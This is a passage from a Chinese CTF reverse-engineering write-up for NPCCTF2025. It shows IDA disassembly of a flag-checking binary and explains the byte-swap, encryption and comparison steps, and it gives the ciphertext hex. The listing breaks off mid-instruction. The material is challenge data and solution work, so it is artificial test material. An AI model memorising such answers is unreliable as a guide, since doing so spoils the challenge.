<span class="hljs-comment">; CODE XREF: .text:0000000000001135↓j</span><br><span class="hljs-symbol">.text:</span>000000000000112E                 <span class="hljs-keyword">jz</span>      short loc_1143<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001130</span>                 <span class="hljs-keyword">cmp</span>     [<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">bl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001132</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001135</span>                 <span class="hljs-keyword">jz</span>      short loc_112E<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001137</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001137</span> loc_1137:                               <span class="hljs-comment">; CODE XREF: .text:000000000000115B↓j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001137</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>000000000000113A                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>000000000000113E                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001142</span>                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001143</span> <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001143</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001143</span> loc_1143:                               <span class="hljs-comment">; CODE XREF: .text:loc_112E↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001143</span>                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001144</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001146</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">100h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000114D</span>                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001152</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001152</span> loc_1152:                               <span class="hljs-comment">; CODE XREF: .text:000000000000111C↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001152</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001154</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aWrong     <span class="hljs-comment">; &quot;Wrong!&quot;</span><br><span class="hljs-symbol">.text:</span>000000000000115B                 <span class="hljs-keyword">jnz</span>     short loc_1137<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000115D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000115D</span> loc_115D:                               <span class="hljs-comment">; CODE XREF: .text:000000000000112C↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000115D</span>                                         <span class="hljs-comment">; .text:00000000000012D2↓j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000115D</span>                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001160</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001164</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdx</span>, unk_4040<br><span class="hljs-symbol">.text:</span>000000000000116B                 <span class="hljs-keyword">call</span>    sub_188E<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001170</span>                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0F0h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001178</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2260<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001180</span>                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0E0h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001188</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2250<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001190</span>                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0D0h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001198</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2240<br><span class="hljs-symbol">.text:</span>00000000000011A0                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0C0h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000011A8                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2230<br><span class="hljs-symbol">.text:</span>00000000000011B0                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0B0h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000011B8                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2220<br><span class="hljs-symbol">.text:</span>00000000000011C0                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0A0h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000011C8                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2210<br><span class="hljs-symbol">.text:</span>00000000000011D0                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">90h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000011D8                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2200<br><span class="hljs-symbol">.text:</span>00000000000011E0                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">80h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000011E8                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_21F0<br><span class="hljs-symbol">.text:</span>00000000000011F0                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">70h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000011F5                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_21E0<br><span class="hljs-symbol">.text:</span>00000000000011FD                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">60h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001202</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_21D0<br><span class="hljs-symbol">.text:</span>000000000000120A                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">50h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000000120F                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_21C0<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001217</span>                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">40h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000000121C                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_21B0<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001224</span>                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">30h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001229</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_21A0<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001231</span>                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">20h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001236</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2190<br><span class="hljs-symbol">.text:</span>000000000000123E                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">10h</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001243</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2180<br><span class="hljs-symbol">.text:</span>000000000000124B                 <span class="hljs-keyword">movaps</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000000124F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001252</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001255</span>                 <span class="hljs-keyword">movdqa</span>  <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:xmmword_2170<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000125D</span>                 <span class="hljs-keyword">jnz</span>     short loc_127D<br><span class="hljs-symbol">.text:</span>000000000000125F<br><span class="hljs-symbol">.text:</span>000000000000125F loc_125F:                               <span class="hljs-comment">; CODE XREF: .text:000000000000126C↓j</span><br><span class="hljs-symbol">.text:</span>000000000000125F                                         <span class="hljs-comment">; .text:0000000000001284↓j ...</span><br><span class="hljs-symbol">.text:</span>000000000000125F                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">sil</span>, <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001262</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-number">dh</span>, <span class="hljs-built_in">cl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001264</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001268</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span>000000000000126C                 <span class="hljs-keyword">jz</span>      short loc_125F<br><span class="hljs-symbol">.text:</span>000000000000126E<br><span class="hljs-symbol">.text:</span>000000000000126E loc_126E:                               <span class="hljs-comment">; CODE XREF: .text:000000000000127B↓j</span><br><span class="hljs-symbol">.text:</span>000000000000126E                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">cl</span>, <span class="hljs-built_in">cl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001270</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001274</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">2</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001278</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">dx</span><br><span class="hljs-symbol">.text:</span>000000000000127B                 <span class="hljs-keyword">jmp</span>     short loc_126E<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000127D</span> <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000127D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000127D</span> loc_127D:                               <span class="hljs-comment">; CODE XREF: .text:000000000000125D↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000127D</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, byte_4080<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001284</span>                 <span class="hljs-keyword">jz</span>      short loc_125F<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001286</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001286</span> loc_1286:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001110↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001286</span>                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">cl</span>, <span class="hljs-built_in">cl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001288</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">cs</span>:byte_4080<br><span class="hljs-symbol">.text:</span>000000000000128F                 <span class="hljs-keyword">jb</span>      short loc_12B0<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001291</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001294</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rax</span>+<span class="hljs-number">1</span>], <span class="hljs-built_in">cl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001297</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rdx</span>-<span class="hljs-number">1</span>], <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span>000000000000129B                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>000000000000129F                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>00000000000012A3                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000012A6                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span>00000000000012A9                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdx</span>, byte_4080<br><span class="hljs-symbol">.text:</span>00000000000012B0<br><span class="hljs-symbol">.text:</span>00000000000012B0 loc_12B0:                               <span class="hljs-comment">; CODE XREF: .text:000000000000128F↑j</span><br><span class="hljs-symbol">.text:</span>00000000000012B0                 <span class="hljs-keyword">jnb</span>     loc_111E<br><span class="hljs-symbol">.text:</span>00000000000012B6                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>00000000000012B9                 <span class="hljs-keyword">jnz</span>     short loc_12C8<br><span class="hljs-symbol">.text:</span>00000000000012BB                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">1</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>00000000000012BF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span>00000000000012C3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span>00000000000012C6                 <span class="hljs-keyword">jz</span>      short loc_125F<br><span class="hljs-symbol">.text:</span>00000000000012C8<br><span class="hljs-symbol">.text:</span>00000000000012C8 loc_12C8:                               <span class="hljs-comment">; CODE XREF: .text:00000000000012B9↑j</span><br><span class="hljs-symbol">.text:</span>00000000000012C8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000012CB                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">cs</span>:byte_4080, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>00000000000012D2                 <span class="hljs-keyword">jz</span>      loc_115D<br><span class="hljs-symbol">.text:</span>00000000000012D8                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-symbol">.text:</span>00000000000012DA                 <span class="hljs-keyword">call</span>    sub_14FE<br><span class="hljs-symbol">.text:</span>00000000000012DF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000012E2                 <span class="hljs-keyword">call</span>    ___isoc23_scanf<br><span class="hljs-symbol">.text:</span>00000000000012E7                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000012EA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000012EC                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aS         <span class="hljs-comment">; &quot;%s&quot;</span><br><span class="hljs-symbol">.text:</span>00000000000012F3                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>00000000000012F8                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">100h</span><br><span class="hljs-symbol">.text:</span>00000000000012FF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rbx</span>, byte_4080<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001306</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001308</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aInputYourFlag <span class="hljs-comment">; &quot;Input your flag:&quot;</span><br><span class="hljs-symbol">.text:</span>000000000000130F                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001310</span>                 <span class="hljs-keyword">inc</span>     <span class="hljs-built_in">edi</span><br></code></pre></td></tr></table></figure><p>但是观察后不难发现这里的汇编顺序是反的，往后翻的话还能找到几处类似的地方<br>上面的那部分汇编的逻辑大致是:<br>读取用户输入到 byte_4080，<br>有一个字节交换<br>调用加密函数<br>字符串比较判断</p><h4 id="密文"><a href="#密文" class="headerlink" title="密文"></a>密文</h4><p>密文在 <strong>unk_4040</strong> 处<br>提取出来为 <code>131C175213525245143E3E114550053E16511A0F0006070D</code></p><p><img src="/../images/NPCCTF2025/r1.png"></p><h4 id="flag-格式对比"><a href="#flag-格式对比" class="headerlink" title="flag 格式对比"></a>flag 格式对比</h4><p>第二处飘红的地方，比较输入的字符是否符合 flag{} 的格式</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001410</span> loc_1410:                               <span class="hljs-comment">; DATA XREF: sub_10B0+1E↑o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001410</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0A8h</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001417</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, unk_1098<br><span class="hljs-symbol">.text:</span>000000000000141E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001421</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001424</span>                 <span class="hljs-keyword">jb</span>      short locret_1490<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001426</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdx</span>, _term_proc<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000142D</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001430</span>                 <span class="hljs-keyword">jnb</span>     short locret_1490<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001432</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001435</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">r9</span>, unk_2040<br><span class="hljs-symbol">.text:</span>000000000000143C                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>000000000000143F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001442</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001444</span>                 <span class="hljs-keyword">shr</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001448</span>                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">7</span><br><span class="hljs-symbol">.text:</span>000000000000144B                 <span class="hljs-keyword">movsx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r9</span>+<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001450</span>                 <span class="hljs-keyword">bt</span>      <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001453</span>                 <span class="hljs-keyword">jnb</span>     short locret_1490<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001455</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001459</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000145D</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">edi</span><br><span class="hljs-symbol">.text:</span>000000000000145F<br><span class="hljs-symbol">.text:</span>000000000000145F loc_145F:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001487↓j</span><br><span class="hljs-symbol">.text:</span>000000000000145F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001462</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001464</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001468</span>                 <span class="hljs-keyword">shr</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span>000000000000146C                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">7</span><br><span class="hljs-symbol">.text:</span>000000000000146F                 <span class="hljs-keyword">movsx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r9</span>+<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001474</span>                 <span class="hljs-keyword">sar</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">cl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001476</span>                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001479</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>000000000000147C                 <span class="hljs-keyword">mov</span>     <span 